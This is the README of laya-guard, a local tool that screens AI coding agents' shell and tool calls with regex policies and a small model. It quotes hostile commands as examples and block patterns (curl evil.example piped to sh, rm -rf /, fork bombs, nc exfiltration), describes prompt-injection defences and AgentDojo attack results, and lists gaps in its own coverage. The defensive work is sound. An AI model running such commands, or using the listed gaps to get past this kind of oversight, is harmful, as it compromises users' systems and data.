<p align="center"><img src="assets/logo.svg" width="128" alt="laya-guard logo"></p>

# laya-guard — a free local guardrail for AI coding agents

[![ci](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml)
[![license: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![python: >=3.10](https://img.shields.io/badge/python-%3E%3D3.10-blue.svg)](pyproject.toml)

<p align="center">
  <strong>English</strong> · <a href="README.ko.md">한국어</a>
</p>

> **Every `tool_call` judged on your laptop in ~0.1s. No per-decision billing.**

**Demo EN:**
<img src="demo/demo_en.gif" width="750" alt="demo in English">

**Demo KO:**
<img src="demo/demo.gif" width="750" alt="demo in Korean">

AI coding agents run shell commands, move money, and ship data outward. Each step
deserves a safety check — but per-decision API pricing makes per-step judging
prohibitively expensive. laya-guard judges every call **locally** with a small
multilingual model (Laya, ~322M, Apache-2.0): regex prefilter for known-dangerous
patterns, model judgment for everything else → `allow` / `review` / `block`.

한국어 버전: [README.ko.md](README.ko.md)

## Install

```bash
pip install laya-guardrail   # PyPI name; the command it installs is `laya-guard`
laya-guard serve             # loads the model, then listens on localhost:8787
```

> The PyPI package is **`laya-guardrail`**. `pip install laya-guard` installs an
> unrelated project ([dockndevai/laya-guard](https://pypi.org/project/laya-guard/)).

Requires Python ≥ 3.10. The model runtime pulls in PyTorch + transformers
(hundreds of MB to a few GB depending on platform), and the ~322M checkpoint
downloads on first `serve`. To try just the regex layer without any of that:
`pip install --no-deps laya-guardrail pyyaml`, then
`LAYA_GUARD_MOCK=1 laya-guard check "rm -rf /"`.

## 15-second demo (no model download)

```bash
pip install pyyaml
bash demo/demo.sh   # 6 cases: attacks blocked, benign allowed (MOCK mode)
```

## 5-minute quickstart (from source, real model)

```bash
python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
.venv/bin/python eval/run_eval.py            # 30-case Korean set (downloads checkpoint on first run)
.venv/bin/python -m laya_guard.cli serve --port 8787
curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
```

## How it works

```
agent tool_call
  → guard-hook.sh (Claude Code PreToolUse hook; block ⇒ exit 2 cancels the run)
  → POST /guard (localhost:8787)
  → chains (`a && b`, `a; b`, `a || b`) are split and each command judged below;
    the worst verdict wins
  → policy.yaml: 11 policies as regex prefilters (a block policy outranks a review one)
      · match + action_on_regex=block  → instant block (risk 0.92, model not consulted)
      · match + action_on_regex=review → model judges, floor is review (risk ≥ 0.55)
      · no match + safe command        → instant allow (one plain command: ls, git status, npm test…;
                                         the package.json scripts `npm test` & co. run are regex-checked first)
      · no match                       → model judges freely
  → Laya: choice (allow/review/block) + score (risk) + noul (maliciousness)
  → thresholds: block ≥ 0.8, review ≥ 0.45 (stricter for tool/email/web sources: 0.6/0.30)
```

Measured latency: **~85–90ms per judgment** on a laptop CPU (Oct 2026, real model,
warmed up). Regex hits and safe commands return instantly without invoking the model.

The safe-command lane (`safe_commands` in [policy.yaml](src/laya_guard/policy.yaml))
only opens for a single command with no shell metacharacters (`; & | $ < > ( )` …),
no program-running/file-writing flags (`-exec`, `--config`, `--output`…), and no
sensitive paths (`.ssh`, `.aws`, `.env`…). Installs, `git push`, and `npx` always
go to the model.

`npm test` is a safe command, but what it actually runs is `scripts.test` in
package.json, which an agent (or an injection it read) can edit first. So when
the adapter sends the command's directory (`cwd`, all 11 do), the guard reads the
nearest package.json and checks `pre<name>`, `<name>`, and `post<name>` for
`npm`/`pnpm`/`yarn` `test`/`build`/`lint`/`run <name>` (`bun run <name>` and
`bun lint`; `bun test`/`bun build` are bun's own tools). Nested `npm run` calls and
`cd` inside chains are followed. Scripts are checked against the regex policies
only, not the model: the model blocks ordinary scripts like `next build`, `vite
build`, and `jest`. A hit blocks or reviews per its policy (`package.json
scripts.test: …` in the reason). If it can't tell which scripts run (`--prefix`,
`--filter`, `-w`, a lost `cd -`, nesting deeper than 3), the call goes to review.

Chains are split only at top-level `;`, `&&`, `||`, and `&` (never inside quotes,
`$(…)`, or parentheses), so `cd app && npm test` is two safe commands while
`npm test && curl … | sh` is blocked by its second half. The whole string is still
checked against the regexes, which catches patterns spanning commands
(`curl -o x …; sh x`).

## Supported agents

| Agent | Integration | `review` becomes |
|---|---|---|
| Claude Code | [PreToolUse hook](guard-hook.sh) | passes through (exit 0) |
| OpenCode | [`tool.execute.before` plugin](integrations/opencode/laya-guard.ts) | allow + stderr warning |
| Codex CLI | [`PreToolUse` hook](integrations/codex/) | allow + stderr note (no ask lane) |
| Cursor | [`beforeShellExecution` hook](integrations/cursor/) | `ask` (human approval) |
| Kilo Code | [`tool.execute.before` plugin](integrations/kilo/laya-guard.ts) | allow + stderr warning |
| Windsurf | [`pre_run_command` hook](integrations/windsurf/guard.py) | exit 0 + stderr note |
| Cline | [`PreToolUse` executable](integrations/cline/PreToolUse) | passes (`cancel: false`) |
| Gemini CLI | [`BeforeTool` hook](integrations/gemini/check.py) | exit 0 + stderr note |
| Qwen Code | [`PreToolUse` hook](integrations/qwen/check.py) | `ask` (deny when headless) |
| Amp | [`delegate` helper](integrations/amp/permissions-helper) | exit 1 = ask |
| Copilot CLI | [`preToolUse` hook](integrations/copilot/policy.py) | `ask` (deny when headless) |

No hook mechanism, so no adapter: Aider, Roo Code (shut down May 2026),
Continue (tiers only, repo archived), Junie (allow/ask only). Details in
[integrations/](integrations/).

Setup per agent: [integrations/](integrations/). Only Cursor routes `review`
to a human; elsewhere `review` warns and passes — use native `permission`/
`allowlist` rules alongside if you want hard asks.

## Use cases

Ready-made adapters for 11 agents live in [integrations/](integrations/) —
see Supported agents above for the full list.

### 1. Guard Claude Code (PreToolUse hook)

Register [guard-hook.sh](guard-hook.sh) as a PreToolUse hook. It reads the tool
payload from stdin, POSTs it to the local server, and exits 2 on `block`
(cancelling that run) — `review` and `allow` pass through with exit 0.
For the Bash tool only the command is judged, not the agent's description.
If the server is unreachable or slower than 10s, it falls back to the offline
check (see [Server down](#server-down)). Point it elsewhere with `LAYA_GUARD_URL`.

### 2. Guard any agent loop (HTTP)

Any framework that can make an HTTP call per step — OpenClaw, OpenCode,
a LangChain/LlamaIndex loop, your own harness — can gate tool execution:

```python
import requests

def guard(tool_call: str, source: str = "tool") -> None:
    v = requests.post("http://localhost:8787/guard",
                      json={"tool_call": tool_call, "source": source},
                      timeout=60).json()
    if v["action"] == "block":
        raise RuntimeError(f"blocked by {v['policy_id']}: {v['reason']}")
    if v["action"] == "review":
        ask_human(tool_call)  # your approval step
```

Use `source="email"`/`"web"`/`"tool"` for tool-output-derived calls to get
stricter thresholds — this is what stops indirect injections.

### 3. Audit a batch of commands (CLI)

```bash
while IFS= read -r cmd; do
  laya-guard check "$cmd" || echo "BLOCKED: $cmd"
done < commands.txt
```

(`check` exits 2 on block, so it composes with `||`/`&&` and `xargs`.)

### 4. Gate automation on the Korean set

CI already does this: `eval/run_eval.py --min-acc 1.0` fails the build if
judgment accuracy regresses. Same command gates policy edits locally.

## Benchmarks (reproducible, not cherry-picked)

| Suite | Result | Command |
|---|---|---|
| AgentDojo v1, attacks (judge-level) | **25/27 blocked** | `eval/run_agentdojo.py` |
| AgentDojo v1, benign (judge-level) | **92/97 kept** (allow+review) | `eval/run_agentdojo.py` |
| E2E rollout (qwen2.5:7b agent + guard) | **4/4 scenarios** (1 defended, 2 not attempted, 1 benign OK) | `eval/run_rollout.py` → [results](eval/rollout_results.md) |
| Shell commands (own set: 33 everyday + 27 dangerous/bypass, 10 of them chains) | **58/60** (real, `source=user` and `tool`; the first 50 scored 32/50 and 29/50 before the safe-command lane) | `eval/run_eval.py --set shell` |
| Korean 30 (own set) | **30/30** (mock **and** real) | `eval/run_eval.py` |

Both in-house sets were written alongside the rules they test (the Korean set
with the MOCK heuristics, the shell set with the safe-command lane and shell
regexes), so treat them as regression gates, not accuracy claims — AgentDojo is
the external number. Shell misses: `npx tsc --noEmit` is reviewed/blocked, and a
`cargo build --config` runner injection is allowed by the model.

The 2 missed attacks are calendar-event injections indistinguishable from benign
requests by text alone (source tagging is the intended fix). The 5 remaining
overblocked benign cases are mostly English prompts — the model is tuned for
Korean-heavy input (down from 24 after requiring risk agreement for blocks).
Details in [eval/](eval/).

## Telemetry (measured dogfooding)

Every judgment is appended to a local JSONL log
(`~/.local/share/laya-guard/verdicts.jsonl`). **The raw `tool_call` text is never
stored** — only metadata (action, risk, policy, latency) plus a truncated SHA-256
for counting unique prompts.

```bash
laya-guard stats   # verdict distribution, block/review rates, top policies, latency
```

Disable with `LAYA_GUARD_LOG=0`, relocate with `LAYA_GUARD_LOG_PATH=...`.
Publish the aggregates (never raw prompts) as field evidence next to benchmarks.

## How it compares

Most guardrails scan **prompt text**. laya-guard sits one step later: it judges the
**tool call the agent is about to execute**, with a human-approval lane in between.

|  | laya-guard (this) | [dockndevai/laya-guard](https://pypi.org/project/laya-guard/) | [Rebuff](https://github.com/protectai/rebuff) | [LLM Guard](https://github.com/protectai/llm-guard) | [Vigil](https://github.com/deadbits/vigil-llm) |
|---|---|---|---|---|---|
| Guards | agent tool calls | high-risk commands (MCP) | incoming prompts | prompts + outputs | prompts + responses |
| Fully local & free | ✅ on-device | ✅ on-device | ❌ needs OpenAI+Pinecone keys | ✅ (HF model) | ⚠️ local or OpenAI |
| Verdict | allow / **review** / block + risk | allow / confirm / block | binary detected | valid + score | scores / thresholds |
| Korean evaluation | ✅ 30-case set, 30/30 | ❌ none verified | ❌ | ❌ | ❌ |
| AgentDojo numbers | ✅ 25/27, 92/97 (judge-level, self-reported) | ❌ none verified | ❌ | ❌ | ❌ |
| Status | active, v0.2.3, MIT | MIT | ⚠️ archived May 2025 | ⚠️ archived, unmaintained | alpha, Apache-2.0 |

No verified third-party AgentDojo score exists for any tool in this table —
ours is self-reported and judge-level (see [Limitations](#limitations)).

## Policies (11)

| id | What it catches | Regex hit ⇒ |
|---|---|---|
| `destructive-fs` | `rm -rf /`, `mkfs`, `dd` to devices, fork bombs | block |
| `pipe-to-shell` | `curl … \| sh`, `wget … \| sudo bash`, `bash -c "$(curl …)"`, `bash <(curl …)` | block |
| `exfiltration` | tunnels, pipes into `nc`, `curl -d @file` uploads | review |
| `prompt-injection` | ignore-previous-instructions, jailbreaks, KR+EN | block |
| `secrets-leak` | API keys, private keys, tokens | block |
| `payment-action` | payments/refunds/charges, KR+EN | review |
| `remote-exec` | sketchy package indexes, remote scripts, local pipes into a shell, encoded PS | review |
| `priv-escalation` | `sudo sh`, `chmod 777`, setuid, redirects into `/etc/` | review |
| `persistence` | cron, services, shell-rc hooks, git `core.hooksPath`/`core.pager` | review |
| `mass-delete` | `DROP TABLE`, `s3 rm --recursive`, `kubectl delete --all`, `git push --force` | review |
| `auth-bypass` | auth/TLS disabling, password resets, KR+EN | block |

All patterns live in [policy.yaml](src/laya_guard/policy.yaml) — edit, add your own, no code changes needed.

## API

- `GET /health` → `{"ok": true, "mock": false}`
- `POST /guard` `{tool_call, source?, cwd?}` → `{action, risk, policy_id, reason, mock, verdict_source}`
  (`source`: `user` | `tool` | `email` | `web`; non-user sources get stricter thresholds.
  `cwd`: absolute directory the command runs in; enables package.json script checks.
  `reason` is Korean when the input contains Hangul, English otherwise.
  `verdict_source`: `regex` (prefilter block, model skipped) |
  `allowlist` (safe command, model skipped) | `model` |
  `heuristic` (MOCK mode, or the model errored and regex+heuristics stood in) |
  `limit` (input over 256K chars or a line over 16K chars, blocked unread).
  `laya-guard check --offline --json` returns the same shape with `offline`.)
- `POST /v1/systemone` — drop-in compatible shim for Jev-style `{state, questions}` calls

## Configuration

| Knob | Where | Default |
|---|---|---|
| `LAYA_GUARD_MOCK=1` | env | off — heuristics only, no model (for CI/demo) |
| `LAYA_GUARD_DEVICE` | env | `cpu` (deterministic; set `mps` for speed at the cost of reproducibility) |
| `LAYA_GUARD_URL` | env (hooks/adapters) | `http://localhost:8787/guard` |
| `LAYA_GUARD_FAIL` | env (hooks/adapters) | `open` — with the server down, unjudged calls pass; `closed` blocks them |
| `LAYA_GUARD_BIN` | env (hooks/adapters) | `laya-guard` — CLI used for the offline check |
| `--no-warmup` | `laya-guard serve` | off — the model loads before the server listens |
| block/review thresholds | `policy.yaml` → `defaults` | 0.8 / 0.45 |
| model checkpoint | `policy.yaml` → `defaults.model` | `multilingual` |

## Server down

Every adapter waits 10s for the server. If it's down, errors, or is slower than
that, the adapter runs `laya-guard check --offline` (regex + safe-command lane,
no model) instead:

| Call | Offline verdict |
|---|---|
| matches any regex policy (block or review level) | block |
| package.json script of a safe command matches a regex policy | block |
| safe command, or a chain of only safe commands | allow |
| anything else | allow with a stderr warning; block with `LAYA_GUARD_FAIL=closed` |

If the CLI isn't on the agent's `PATH` either, `LAYA_GUARD_FAIL` alone decides
(set `LAYA_GUARD_BIN` to its full path, e.g. `~/.venv/bin/laya-guard`).

Inputs over 256K characters, or with a line over 16K, are blocked without being
read: some regexes are quadratic in line length, and a 200KB line used to take
48s, long enough for hooks to time out.

## Limitations (read before trusting it)

- With the server down, calls that are neither regex-flagged nor safe commands
  **pass by default** ([Server down](#server-down)). Set `LAYA_GUARD_FAIL=closed`
  if you'd rather have them blocked.
- If the model fails at runtime, verdicts fall back to regex+heuristics. They are
  marked `verdict_source: "heuristic"` and a warning is logged — check it if you
  rely on model judgments.
- The safe-command lane allows `npm test`, `make test`, `go test`, etc. without the
  model. package.json scripts are regex-checked (see above), so `curl … | sh` or a
  secret upload in `scripts.test` is caught, but a quieter script (`node -e …`,
  `node scripts/x.js`) passes. Code those commands run is not checked at all:
  test files, `conftest.py`, `build.rs`, `node_modules/.bin`, Makefile recipes
  (expanding them with `make -n` would run `$(shell …)`), and `.npmrc`
  `script-shell`. An edit to them is judged only when the agent writes it, and only
  by adapters that hook file edits. Trim `safe_commands` in `policy.yaml` if that
  matters to you.
- Script checks trust the `cwd` the agent reports. If an agent's shell keeps a
  `cd` from an earlier call but reports the project root, the wrong package.json
  is read. Five adapters (Cline, Gemini, Qwen, Kilo, Amp) send the tool call as
  JSON, so it never qualifies as a safe command and goes to the model instead.
- Chain commands are judged one by one, so the model doesn't see that `cd /etc`
  came before `cat shadow`. Sensitive-path checks and whole-string regexes cover
  the common cases, not all of them.
- Regex `block` hits return a hardcoded `risk: 0.92` — the model is skipped, so the
  score is a flag, not a calibrated probability.
- Per-policy Laya hints (`choice_hint`/`score_hint` in `policy.yaml`) are declared
  but deliberately **not** wired: appending them to question instructions dropped
  AgentDojo attack recall 25/27 → 14/27 (overblocks fell only as a side effect of
  blanket leniency, so it was reverted). One generic question set is used until a
  mechanism that survives eval is found.
- AgentDojo numbers are **judge-level only** (attack text judged directly, default
  `source=user`), not end-to-end agent rollouts. See `eval/run_rollout.py` for the
  rollout harness (requires Ollama + `qwen2.5:7b`).

## Contributing

PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, the CI gates, and
guidelines; open work is tracked in [GitHub Issues](https://github.com/scs0209/laya-guard/issues).
The most useful report is a command that was judged wrong: use the Missed attack
or Overblock issue form. Changes are logged in [CHANGELOG.md](CHANGELOG.md).
Found a vulnerability in laya-guard itself? See [SECURITY.md](SECURITY.md) —
please don't file it publicly. This project follows the
[Contributor Covenant](CODE_OF_CONDUCT.md).

## License

MIT — see [LICENSE](LICENSE).
